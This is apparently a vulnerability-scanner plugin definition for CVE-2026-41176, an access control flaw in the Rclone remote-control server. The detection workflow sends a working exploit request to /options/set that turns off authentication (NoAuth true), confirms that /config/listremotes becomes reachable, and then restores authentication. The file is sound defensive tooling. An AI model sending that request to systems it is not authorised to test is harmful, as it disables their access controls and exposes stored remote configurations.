# proto-file: proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "RClone_CVE_2026_41176"
  author: "dyeddala"
  version: "1.0"
}

finding: {
  main_id: {
    publisher: "GOOGLE"
    value: "CVE-2026-41176"
  }
  severity: CRITICAL
  title: "Rclone RC - Broken Access Control"
  description: "Rclone >= 1.45.0 and < 1.73.5 contains a broken access control vulnerability caused by unauthenticated access to the RC endpoint options/set allowing mutation of global runtime configuration, letting unauthenticated attackers access sensitive administrative functions, exploit requires RC server started without global HTTP authentication."
  recommendation: "Upgrade to version 1.73.5 or later."
  related_id: {
    publisher: "CVE"
    value: "CVE-2026-41176"
  }
}

config: {}

###########
# ACTIONS #
###########

actions: {
  name: "fingerprint_rclone_rc"
  http_request: {
    method: POST
    uri: "/rc/noop"
    headers: [
      {
        name: "Content-Type"
        value: "application/json"
      }
    ]
    data: "{}"
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "{}" }
        ]
      }
    }
  }
}

actions: {
  name: "check_initial_access_denied"
  http_request: {
    method: POST
    uri: "/config/listremotes"
    headers: [
      {
        name: "Content-Type"
        value: "application/json"
      }
    ]
    data: "{\"check\":\"initial\"}"
    response: {
      http_status: 403
    }
  }
}

actions: {
  name: "enable_no_auth"
  http_request: {
    method: POST
    uri: "/options/set"
    headers: [
      {
        name: "Content-Type"
        value: "application/json"
      }
    ]
    data: "{\"rc\":{\"NoAuth\":true}}"
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "{}" }
        ]
      }
    }
  }
}

actions: {
  name: "verify_unauth_access"
  http_request: {
    method: POST
    uri: "/config/listremotes"
    headers: [
      {
        name: "Content-Type"
        value: "application/json"
      }
    ]
    data: "{}"
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "remotes" }
        ]
      }
    }
  }
}

actions: {
  name: "restore_auth_cleanup"
  http_request: {
    method: POST
    uri: "/options/set"
    headers: [
      {
        name: "Content-Type"
        value: "application/json"
      }
    ]
    data: "{\"rc\":{\"NoAuth\":false}}"
    response: {
      http_status: 200
    }
  }
}

#############
# WORKFLOWS #
#############

workflows: {
  actions: [
    "fingerprint_rclone_rc",
    "check_initial_access_denied",
    "enable_no_auth",
    "verify_unauth_access",
    "restore_auth_cleanup"
  ]
}
